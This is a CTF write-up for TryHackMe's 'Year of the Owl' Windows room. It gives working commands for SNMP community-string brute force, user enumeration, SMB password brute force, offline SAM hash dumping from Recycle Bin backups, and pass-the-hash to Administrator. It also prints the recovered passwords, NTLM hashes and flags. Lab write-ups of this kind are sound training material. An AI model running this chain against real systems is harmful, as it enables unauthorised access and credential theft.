# TryHackMe: Year of the Owl

**Room:** [Year of the Owl](https://tryhackme.com/room/yearoftheowl)
**Difficulty:** Hard
**Objective:** Obtain the user and admin flags
**Target IP:** `10.82.129.153`

---

## Recon

### Nmap

```
nmap -sVC -O -p- -Pn 10.82.129.153
```

| Port | Service | Version |
|---|---|---|
| 80/tcp | http | Apache httpd 2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10 |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | microsoft-ds | — |
| 3306/tcp | mysql | MariaDB 10.3.24 or later (unauthorized) |
| 3389/tcp | ms-wbt-server | Microsoft Terminal Services (RDP) |
| 5985/tcp | http | Microsoft HTTPAPI httpd 2.0 (WinRM) |
| 47001/tcp | http | Microsoft HTTPAPI httpd 2.0 |

RDP cert/NTLM info confirms hostname `YEAR-OF-THE-OWL`, domain `year-of-the-owl`, build `10.0.17763` (Windows Server 2019 / Windows 10).

### Directory enumeration

```
gobuster dir -u http://10.82.129.153 -w raft-medium-directories.txt -t 45 -x php,txt,html,bak -b 403,404
```

Only `index.php` (200) returned of interest — no further web foothold found this way.

### SMB / null session

```
enum4linux -a 10.82.129.153
```

Null session rejected — no anonymous SMB access.

### SNMP

UDP scan showed SNMP open on 161/162:

```
nmap -sU -p 161,162 10.82.129.153
```

Community string brute-forced with `onesixtyone`:

```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.82.129.153
```

→ Non-default community string recovered: **`openview`**

SNMP walk against the user table leaked local account names:

```
snmpwalk -c openview -v 2c 10.82.129.153 1.3.6.1.4.1.77.1.2.25.1.1
```

| Username |
|---|
| Guest |
| Jareth |
| Administrator |
| DefaultAccount |
| WDAGUtilityAccount |

A second walk against the running-processes table (`1.3.6.1.2.1.25.4.2.1.4`) revealed installed software and paths — notably `C:\xampp\` and Amazon SSM/XenTools, confirming this is a cloud-hosted Windows box running XAMPP.

Installed-software OID (`1.3.6.1.2.1.25.6.3.1.2`) confirmed **XAMPP** as installed software, alongside Amazon SSM Agent and VC++ redistributables.

---

## Attack Chain (ASCII)

```
SNMP (community: openview)
        │
        ▼
Leak local usernames via snmpwalk
        │
        ▼
Target "Jareth" — brute-force credentials
        │
        ├── Hydra → RDP (3389): no valid hit
        └── NetExec → SMB (445): jareth:sarah ✓
                │
                ▼
        Evil-WinRM as jareth → user.txt
                │
                ▼
        Recycle Bin: recover deleted sam.bak / system.bak
                │
                ▼
        impacket-secretsdump (offline, SAM+SYSTEM) → NTLM hashes
                │
                ▼
        Pass-the-Hash as Administrator (NetExec confirms Pwn3d!)
                │
                ▼
        Evil-WinRM as Administrator → admin.txt
```

---

## Exploitation

### Stage 1 — Foothold via SNMP-leaked credentials

With the username list in hand, the exposed services were brute-forced. RDP via Hydra only produced a weak/inactive hit (`jareth:password`, account not RDP-enabled). SMB via NetExec against `rockyou.txt` found the real password:

```
netexec smb 10.82.129.153 -u jareth -p /usr/share/wordlists/rockyou.txt --continue-on-success --ignore-pw-decoding
```

**Valid credentials: `jareth:sarah`**

```
evil-winrm -i 10.82.129.153 -u jareth -p sarah
```

`user.txt` retrieved from `C:\Users\Jareth\Desktop`:

```
THM{Y2I0NDJjODY2NTc2YmI2Y2U4M2IwZTBl}
```

### Stage 2 — Privilege escalation via deleted SAM/SYSTEM backups

`jareth` has no interesting privileges (`whoami /priv` only shows the default two) and no access to `C:\xampp` (Access Denied):

```
icacls C:\xampp
# C:\xampp: Access is denied.
```

Manual enumeration of the filesystem root and the Recycle Bin followed:

```
cd C:\
Get-ChildItem -Force
```

```
Get-ChildItem 'C:\$Recycle.Bin' -Force -Recurse
```

This turned up two forgotten files inside a user SID folder (`S-1-5-21-...-1001`):

```
sam.bak
system.bak
```

These are the **SAM** hive (local password hashes) and **SYSTEM** hive (boot key needed to decrypt SAM). Both were copied to a writable path and pulled down with Evil-WinRM's `download`:

```
Copy-Item 'C:\$Recycle.Bin\...\sam.bak' -Destination C:\Users\Jareth\Desktop\sam.bak
Copy-Item 'C:\$Recycle.Bin\...\system.bak' -Destination C:\Users\Jareth\Desktop\system.bak
download sam.bak
download system.bak
```

Dumped offline on the attacker box:

```
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

```
Administrator:500:...:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
Jareth:1001:...:5a6103a83d2a94be8fd17161dfd4555a:::
```

**No cracking required — pass-the-hash straight to Administrator:**

```
netexec smb 10.82.129.153 -u administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a
```
→ `(Pwn3d!)`

```
evil-winrm -i 10.82.129.153 -u administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a
```

`admin.txt` retrieved from `C:\Users\Administrator\Desktop`:

```
THM{YWFjZTM1MjFiZmRiODgyY2UwYzZlZWM2}
```

---

## Flags

| Flag | Value |
|---|---|
| user.txt | `THM{Y2I0NDJjODY2NTc2YmI2Y2U4M2IwZTBl}` |
| admin.txt | `THM{YWFjZTM1MjFiZmRiODgyY2UwYzZlZWM2}` |

---

## Vulnerabilities

- **SNMP with weak/default community string (`openview`)** — allowed unauthenticated enumeration of local usernames and installed software, directly enabling the username-based brute-force attack.
- **Weak user password** — `jareth:sarah` was crackable via a standard SMB credential-stuffing run against `rockyou.txt`.
- **Sensitive files left recoverable in the Recycle Bin** — deleted `sam.bak` / `system.bak` backups of the SAM and SYSTEM hives remained readable by a low-privileged user, enabling full offline hash extraction without any additional privilege escalation primitive.
- **No hash rotation / shared local Administrator hash** — once extracted, the Administrator NTLM hash worked directly via pass-the-hash, with no need to crack it.

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port/service/OS enumeration |
| gobuster | Web directory brute-force |
| enum4linux | SMB null-session enumeration |
| onesixtyone | SNMP community string brute-force |
| snmpwalk | SNMP OID enumeration (users, software, processes) |
| hydra | RDP credential brute-force |
| netexec (CME) | SMB credential brute-force, pass-the-hash validation |
| evil-winrm | Remote PowerShell shell over WinRM |
| impacket-secretsdump | Offline SAM/SYSTEM hash extraction |

---

## References

- [TryHackMe — Year of the Owl](https://tryhackme.com/room/yearoftheowl)
- [Impacket secretsdump](https://github.com/fortra/impacket)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
